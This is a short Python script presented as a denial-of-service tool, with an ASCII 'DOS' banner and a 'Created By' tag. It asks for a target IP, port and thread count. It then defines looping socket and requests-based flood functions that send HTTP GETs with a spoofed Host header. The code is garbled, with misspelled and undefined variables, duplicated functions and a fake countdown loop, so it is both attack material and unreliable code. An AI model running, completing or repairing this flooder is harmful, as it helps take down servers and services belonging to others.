print("██████╗░░█████╗░░██████╗")
print("██╔══██╗██╔══██╗██╔════╝")
print("██║░░██║██║░░██║╚█████╗░")
print("██║░░██║██║░░██║░╚═══██╗")
print("██████╔╝╚█████╔╝██████╔╝")
print("╚═════╝░░╚════╝░╚═════╝░")
print(" Created By:Mr.NightMare")

import socket
import threading

ip = str(input('[+] Target IP:'))
port = int(input('[+] Port:'))
pack = int(input('[+] Packet/s:'))
threads = int(input('[+] Threads:'))

def attack():
      while True:
      	   s = socket.socket(socket.AF_INET, SOCK.STREAM)
      	   s.connect((targer, port))
      	   s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
      	   s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      	   s.close()
      	   
for y in range (10000000):
	print("[*] attack status ===> ",y," sec left ")
ddos = input(" attack done press enter or type exit;  ")

def LaunchRAW(target, thread, t):
      	   until = datetime.datetime.now() + datatime.timedelta(seconds=int(t))
      	   for _ in range(int(thread)):
      	   	try:
      	   		thd = threading.Thread(target=AttackRAW, args=(target, until))
      	   		thd.start()
      	   		
      	   	except:
      	   		pass
      	   		
def AttackRAW(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(target)
            requests.get(target)
        except:
            pass
            
# enderegion

# region PXRAW
def LaunchRAW(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(target, until))
            thd.start()
        except:
            pass
         

  
      	   
attack_num = 123

def attack():
	   while True:
	   	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	   	   s.connect((target, port))
	   	   s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
	   	   s.sendto(("Host:" + fake_ip + "r\n\r\n").encode('ascii'), (targe, port))
	   	   
	   	   global attack_num
	   	   attack_num += 1
	   	   print(attack_num)
	   	   
	   	   s.close()